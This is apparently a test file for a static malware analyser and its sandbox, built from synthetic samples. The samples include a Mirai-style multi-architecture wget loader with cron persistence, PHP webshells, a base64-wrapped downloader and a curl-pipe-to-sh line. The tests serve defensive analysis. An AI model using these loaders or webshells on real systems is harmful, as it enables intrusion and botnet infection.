"""The static analyser, over synthetic samples built to a known shape.

No real malware is used or needed: each sample is constructed here so the test
knows exactly what the analyser should recover, and the point is that it
recovers it from the bytes without executing anything.
"""

import base64
import gzip
import io
import struct
import zipfile

import pytest

from app.payloads import analyzer, identify, indicators, sandbox


# --- identification --------------------------------------------------------

def _elf(machine=0x3E, little=1):
    """A minimal but structurally valid 64-bit ELF header pyelftools accepts."""
    e_ident = b"\x7fELF" + bytes([2, little, 1, 0]) + b"\x00" * 8  # 64-bit
    endian = "<" if little else ">"
    return e_ident + struct.pack(
        endian + "HHIQQQIHHHHHH",
        2, machine, 1,        # e_type=ET_EXEC, e_machine, e_version
        0x400000, 0, 0, 0,    # e_entry, e_phoff, e_shoff, e_flags
        64, 0, 0, 0, 0, 0,    # e_ehsize, phentsize, phnum, shentsize, shnum, shstrndx
    )


class TestIdentify:
    def test_elf_by_magic_not_extension(self):
        ft = identify.identify(_elf())
        assert ft.kind == "elf" and ft.basis == "magic"

    def test_pe(self):
        dos = bytearray(b"MZ" + b"\x00" * 62)
        struct.pack_into("<I", dos, 0x3C, 0x80)
        pe = bytes(dos) + b"\x00" * (0x80 - len(dos)) + b"PE\x00\x00" + b"\x00" * 20
        assert identify.identify(pe).kind == "pe"

    def test_shell_script_by_shebang(self):
        ft = identify.identify(b"#!/bin/sh\nwget http://x/y\n")
        assert ft.kind == "script" and ft.subtype == "sh"

    def test_php_without_extension(self):
        ft = identify.identify(b"<?php system($_GET['c']); ?>")
        assert ft.kind == "script" and ft.subtype == "php"

    def test_gif_php_polyglot(self):
        ft = identify.identify(b"GIF89a" + b"\x00" * 20 + b"<?php eval($_POST[0]); ?>")
        assert ft.kind == "script" and "polyglot" in ft.label.lower()

    def test_elf_extension_does_not_fool_a_script(self):
        # A shell script an attacker named "x86" is still a script.
        assert identify.identify(b"#!/bin/bash\nchmod +x a\n").kind == "script"

    def test_zip_and_gzip(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("a.txt", "hi")
        assert identify.identify(buffer.getvalue()).subtype == "zip"
        assert identify.identify(gzip.compress(b"data")).subtype == "gzip"

    def test_empty(self):
        assert identify.identify(b"").kind == "empty"


# --- indicators ------------------------------------------------------------

class TestIndicators:
    def test_public_ip_and_url_with_origin(self):
        found = indicators.extract([("connect 203.0.113.9:4444 then http://203.0.113.9/b", "strings")])
        assert any(i["value"] == "203.0.113.9" and i["port"] == 4444 for i in found["ips"])
        assert any(i["value"].startswith("http://203.0.113.9") for i in found["urls"])
        assert found["ips"][0]["origin"] == "strings"

    def test_private_ip_is_scoped_not_dropped(self):
        found = indicators.extract([("192.168.1.1 and 8.8.8.8", "strings")])
        scopes = {i["value"]: i["scope"] for i in found["ips"]}
        assert scopes["192.168.1.1"] == "private"
        assert scopes["8.8.8.8"] == "public"

    def test_filenames_are_not_domains(self):
        found = indicators.extract([("libc.so run.sh setup.py readme.md config.rs", "strings")])
        assert found["domains"] == []

    def test_real_domain_is_kept(self):
        found = indicators.extract([("beacon to evil-c2.example.xyz now", "strings")])
        assert any(d["value"] == "evil-c2.example.xyz" for d in found["domains"])

    def test_valid_bitcoin_address(self):
        # A genuine, checksummed mainnet address (Satoshi's, publicly known).
        found = indicators.extract([("send to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", "strings")])
        assert any(w["currency"] == "BTC" for w in found["wallets"])

    def test_invalid_bitcoin_address_is_rejected(self):
        found = indicators.extract([("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb not real", "strings")])
        assert found["wallets"] == []

    def test_ethereum_and_monero(self):
        eth = "0x" + "a" * 40
        xmr = "4" + "B" * 94
        found = indicators.extract([(f"{eth} {xmr}", "strings")])
        currencies = {w["currency"] for w in found["wallets"]}
        assert "ETH" in currencies and "XMR" in currencies

    def test_telegram_bot_token(self):
        found = indicators.extract([('sendMessage bot: api.telegram.org/bot123456789:' + "A" * 35, "strings")])
        assert any(c["kind"] == "telegram_bot" for c in found["c2_channels"])

    def test_discord_webhook(self):
        url = "https://discord.com/api/webhooks/123456789012345678/" + "x" * 30
        found = indicators.extract([(f"exfil to {url}", "strings")])
        assert any(c["kind"] == "discord_webhook" for c in found["c2_channels"])

    def test_stratum_url_is_a_mining_pool(self):
        found = indicators.extract([("-o stratum+tcp://pool.example.com:3333 -u wallet", "strings")])
        assert any("pool.example.com" in p["value"] for p in found["mining_pools"])


# --- end-to-end reports ----------------------------------------------------

class TestReports:
    def test_mirai_style_loader_script(self):
        body = (
            "#!/bin/sh\n"
            "cd /tmp || cd /var/run\n"
            "for arch in mips mipsel arm armv7l x86 i686 sh4; do\n"
            "  wget http://203.0.113.66/bins/nginx.$arch -O .n.$arch\n"
            "  chmod +x .n.$arch; ./.n.$arch; done\n"
            "pkill -9 kinsing; killall xmrig\n"
            "crontab -l | { cat; echo '@reboot /tmp/.n'; } | crontab -\n"
        ).encode()
        report = analyzer.analyse(body)
        assert report["file_kind"] == "script"
        ids = {b["id"] for b in report["script"]["behaviours"]}
        assert {"download", "multi_arch", "make_executable", "execute",
                "kill_competitors", "cron_persistence"} <= ids
        assert any(i["value"] == "203.0.113.66" for i in report["indicators"]["ips"])
        assert "Fetches multiple CPU architectures (IoT botnet loader)" in report["notable"]

    def test_base64_wrapped_downloader_is_unwrapped(self):
        inner = b"#!/bin/sh\nwget http://198.51.100.5/x -O /tmp/x\nchmod +x /tmp/x\n/tmp/x\n"
        outer = b"#!/bin/sh\necho " + base64.b64encode(inner) + b" | base64 -d | sh\n"
        report = analyzer.analyse(outer)
        assert report["script"]["obfuscation"]["layers"] >= 1
        # The C2 only appears after decoding, and is still recovered.
        assert any(i["value"] == "198.51.100.5" for i in report["indicators"]["ips"])

    def test_elf_architecture_and_hashes(self):
        report = analyzer.analyse(_elf(machine=0x08))  # EM_MIPS
        assert report["file_kind"] == "elf"
        assert "MIPS" in report["elf"]["architecture"]
        assert len(report["hashes"]["sha256"]) == 64

    def test_php_webshell_family_hint(self):
        body = b"<?php @eval(base64_decode($_POST['z0'])); // filesman ?>"
        report = analyzer.analyse(body)
        assert report["family"] is not None
        assert report["family"]["kind"] == "webshell"

    def test_zip_is_walked(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("run.sh", "#!/bin/sh\nwget http://203.0.113.7/a\n")
            archive.writestr("readme.txt", "hello")
        report = analyzer.analyse(buffer.getvalue())
        assert report["file_kind"] == "archive"
        names = {m["name"] for m in report["archive"]["members"]}
        assert {"run.sh", "readme.txt"} <= names
        extracted = report["archive"].get("extracted", [])
        assert any(c["file_type"]["kind"] == "script" for c in extracted)

    def test_high_entropy_is_measured(self):
        import os
        report = analyzer.analyse(os.urandom(4096))
        assert report["entropy"] > 7.5

    def test_analysis_never_raises_on_garbage(self):
        for junk in (b"\x00\x01\x02\x03", b"MZ", b"\x7fELF", b"PK\x03\x04", b"#!"):
            report = analyzer.analyse(junk)
            assert "summary" in report


# --- sandbox ---------------------------------------------------------------

class TestSandbox:
    async def test_runs_analyser_in_a_subprocess(self):
        body = b"#!/bin/sh\nwget http://203.0.113.9/x\n"
        result = await sandbox.run(body, timeout=30, memory_mb=512)
        assert result["status"] == "complete"
        assert result["report"]["file_kind"] == "script"

    async def test_timeout_is_reported_not_raised(self, monkeypatch):
        body = b"#!/bin/sh\necho hi\n"
        result = await sandbox.run(body, timeout=0.001, memory_mb=512)
        assert result["status"] == "failed"
        assert "exceeded" in result["error"] or "signal" in result["error"]

    async def test_frame_round_trips(self):
        report = {"file_kind": "elf", "nested": {"a": [1, 2, 3]}}
        assert sandbox._decode(sandbox.frame(report)) == {"status": "complete", "report": report}

    def test_frame_is_only_read_from_the_start_of_stdout(self):
        # The frame used to be found by searching stdout for a marker, which
        # is what let bytes inside the report pose as a second frame.
        framed = sandbox.frame({"file_kind": "elf"})
        for tampered in (b"noise from a library\n" + framed, framed + b"\n", framed[:-1], b""):
            result = sandbox._decode(tampered)
            assert result["status"] == "failed", tampered[:20]
            assert "report" not in result

    def test_result_must_be_a_json_object(self):
        import json

        for payload in (b"[1, 2]", b'"text"', b"not json", b"\xff\xfe"):
            framed = sandbox._HEADER.pack(sandbox._FRAME_MAGIC, len(payload)) + payload
            assert sandbox._decode(framed)["status"] == "failed"
        ok = json.dumps({"a": 1}).encode()
        framed = sandbox._HEADER.pack(sandbox._FRAME_MAGIC, len(ok)) + ok
        assert sandbox._decode(framed) == {"status": "complete", "report": {"a": 1}}

    def test_report_strings_cannot_pose_as_a_result_frame(self):
        """A string from the sample that looks like the old frame stays a string.

        The parent used to take the *last* ``PLD\\x00`` marker in the child's
        output and unpickle what followed. A report quotes text out of the
        uploaded file, so the file could supply that marker and the bytes
        after it. The stand-in here is a pickled plain dict: with the old
        decoder it came back as the whole analysis result.
        """
        import pickle

        forged = pickle.dumps({"file_kind": "forged-by-the-sample"})
        hostile = (b"PLD\x00" + struct.pack(">I", len(forged)) + forged).decode("latin-1")
        report = {"file_kind": "script", "script": {"behaviours": [{"evidence": hostile}]}}

        framed = sandbox.frame(report)
        assert b"PLD\x00" not in framed  # JSON escapes the NUL; no raw marker survives

        result = sandbox._decode(framed)
        assert result["status"] == "complete"
        assert result["report"]["file_kind"] == "script"
        assert result["report"]["script"]["behaviours"][0]["evidence"] == hostile

    def test_sandbox_module_does_not_use_pickle(self):
        import inspect

        from app.payloads import _sandbox_main

        for module in (sandbox, _sandbox_main):
            source = inspect.getsource(module)
            assert "import pickle" not in source and "pickle.loads" not in source

    async def test_sample_carrying_the_old_marker_is_analysed_as_data(self):
        import pickle

        forged = pickle.dumps({"file_kind": "forged-by-the-sample"})
        body = (
            b"#!/bin/sh\nwget http://203.0.113.9/x # "
            + b"PLD\x00" + struct.pack(">I", len(forged)) + forged + b"\n"
        )
        result = await sandbox.run(body, timeout=30, memory_mb=512)
        assert result["status"] == "complete", result
        assert result["report"]["file_kind"] == "script"
        assert result["report"]["hashes"]["sha256"] == __import__("hashlib").sha256(body).hexdigest()

    def test_every_analyser_output_survives_json(self):
        import json

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as archive:
            archive.writestr("run.sh", "#!/bin/sh\nwget http://203.0.113.7/a\n")
        samples = [
            _elf(),
            b"MZ" + b"\x00" * 200,
            b"#!/bin/sh\ncurl http://198.51.100.5/x | sh\n",
            buffer.getvalue(),
            gzip.compress(b"plain text inside"),
            b"\x00\x01\x02",
            b"",
        ]
        for sample in samples:
            report = analyzer.analyse(sample)
            # The exact call the child makes; raises on anything unserialisable.
            decoded = sandbox._decode(sandbox.frame(report))
            assert decoded["status"] == "complete"
            assert decoded["report"] == json.loads(json.dumps(sandbox.to_jsonable(report)))

    def test_to_jsonable_converts_what_pickle_used_to_carry(self):
        value = {
            "bytes": b"\x7fELF\x00",
            "tuple": (1, 2),
            "set": {"b", "a"},
            "nan": float("nan"),
            3: "integer key",
            "object": object,
        }
        converted = sandbox.to_jsonable(value)
        assert converted["bytes"] == "\x7fELF\x00"
        assert converted["tuple"] == [1, 2]
        assert converted["set"] == ["a", "b"]
        assert converted["nan"] is None
        assert converted["3"] == "integer key"
        assert isinstance(converted["object"], str)


class TestSandboxIsolation:
    def test_child_environment_carries_none_of_the_parents_secrets(self, monkeypatch):
        monkeypatch.setenv("SECRET_KEY", "must-not-reach-the-child")
        monkeypatch.setenv("DATABASE_URL", "postgresql://must-not-reach-the-child")
        env = sandbox._child_environment(memory_mb=512, timeout=30)
        assert set(env) == {
            "PATH", "PYTHONPATH", "PAYLOAD_MEMORY_MB", "PAYLOAD_CPU_SECONDS",
            "PYTHONDONTWRITEBYTECODE", "OPENBLAS_NUM_THREADS", "OMP_NUM_THREADS",
            "MKL_NUM_THREADS", "NUMEXPR_NUM_THREADS",
        }
        assert "must-not-reach-the-child" not in " ".join(env.values())

    @pytest.mark.skipif(not __import__("sys").platform.startswith("linux"), reason="rlimits and prctl are Linux-only")
    def test_child_limits_are_hard_and_include_nproc(self):
        """Run the child's own limit code in a throwaway process and read it back."""
        import json
        import subprocess
        import sys

        probe = (
            "import json, resource, sys\n"
            "from app.payloads import _sandbox_main\n"
            "from app.core import hardening\n"
            "hardening.set_no_new_privs()\n"
            "_sandbox_main._apply_limits()\n"
            "names = ['RLIMIT_AS', 'RLIMIT_CPU', 'RLIMIT_FSIZE', 'RLIMIT_NOFILE', 'RLIMIT_NPROC', 'RLIMIT_CORE']\n"
            "out = {n: resource.getrlimit(getattr(resource, n)) for n in names}\n"
            "out['no_new_privs'] = hardening.has_no_new_privs()\n"
            "sys.stdout.write(json.dumps(out))\n"
        )
        env = sandbox._child_environment(memory_mb=1024, timeout=30)
        completed = subprocess.run(
            [sys.executable, "-s", "-c", probe], env=env, capture_output=True, timeout=60,
        )
        assert completed.returncode == 0, completed.stderr.decode()
        limits = json.loads(completed.stdout)
        for name in ("RLIMIT_AS", "RLIMIT_CPU", "RLIMIT_FSIZE", "RLIMIT_NOFILE", "RLIMIT_NPROC", "RLIMIT_CORE"):
            soft, hard = limits[name]
            assert soft == hard, f"{name} hard limit left above the soft one"
        assert limits["RLIMIT_FSIZE"] == [0, 0]
        assert limits["RLIMIT_NPROC"] == [0, 0]
        assert limits["RLIMIT_AS"][1] == 1024 * 1024 * 1024
        assert limits["no_new_privs"] is True

    @pytest.mark.skipif(not __import__("sys").platform.startswith("linux"), reason="prctl is Linux-only")
    def test_api_process_can_be_made_non_dumpable(self):
        # In a child, so the test runner itself keeps its normal flags.
        import subprocess
        import sys

        probe = (
            "from app.core import hardening\n"
            "before = hardening.is_dumpable()\n"
            "ok = hardening.make_non_dumpable()\n"
            "print(before, ok, hardening.is_dumpable())\n"
        )
        env = sandbox._child_environment(memory_mb=1024, timeout=30)
        completed = subprocess.run(
            [sys.executable, "-s", "-c", probe], env=env, capture_output=True, timeout=60,
        )
        assert completed.stdout.decode().split() == ["True", "True", "False"], completed.stderr.decode()


class TestArchiveBounds:
    @pytest.mark.parametrize("container", ["gzip", "bzip2", "xz"])
    def test_single_stream_is_decompressed_within_a_cap(self, container, monkeypatch):
        import bz2
        import lzma

        from app.payloads import archive

        import tracemalloc

        compress = {"gzip": gzip.compress, "bzip2": bz2.compress, "xz": lzma.compress}[container]
        # 24 MiB of zeros compresses to a few kilobytes: the shape of a bomb,
        # at a size that is harmless to build in a test.
        inflated_size = 24 * 1024 * 1024
        bomb = compress(b"\x00" * inflated_size)
        assert len(bomb) < 64 * 1024
        monkeypatch.setattr(archive, "MAX_TOTAL_UNCOMPRESSED", 256 * 1024)
        monkeypatch.setattr(archive, "_CHUNK", 64 * 1024)

        tracemalloc.start()
        try:
            info = archive.analyse(bomb, container)
            _, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()

        assert info["error"] == "decompressed size exceeds budget"
        assert info["members"] == [] and "_extracted" not in info
        # It stopped near the cap. Decompressing first and measuring after,
        # as before, would have peaked at the full inflated size.
        # (The xz decoder's own dictionary accounts for several megabytes.)
        assert peak < inflated_size // 2, f"peak allocation {peak} bytes"

    @pytest.mark.parametrize("container", ["gzip", "bzip2", "xz"])
    def test_small_stream_still_extracts(self, container):
        import bz2
        import lzma

        from app.payloads import archive

        compress = {"gzip": gzip.compress, "bzip2": bz2.compress, "xz": lzma.compress}[container]
        info = archive.analyse(compress(b"#!/bin/sh\necho hi\n"), container)
        assert info["member_count"] == 1
        assert info["_extracted"] == [("(decompressed)", b"#!/bin/sh\necho hi\n")]

    def test_truncated_stream_is_an_error_not_a_crash(self):
        from app.payloads import archive

        info = archive.analyse(gzip.compress(b"x" * 10000)[:40], "gzip")
        assert "error" in info and info["members"] == []


class TestStorableLabels:
    def test_long_shebang_cannot_overflow_the_file_type_column(self):
        ft = identify.identify(b"#!/usr/bin/" + b"A" * 5000 + b"\necho hi\n")
        assert ft.kind == "script"
        assert len(ft.label) <= 64 and len(ft.subtype) <= 32 and len(ft.mime) <= 64

    def test_shebang_with_control_bytes_gives_a_clean_label(self):
        ft = identify.identify(b"#!/bin/\x01\x02sh\x7f\necho hi\n")
        assert ft.kind == "script"
        assert all(32 <= ord(ch) < 127 for ch in ft.label)
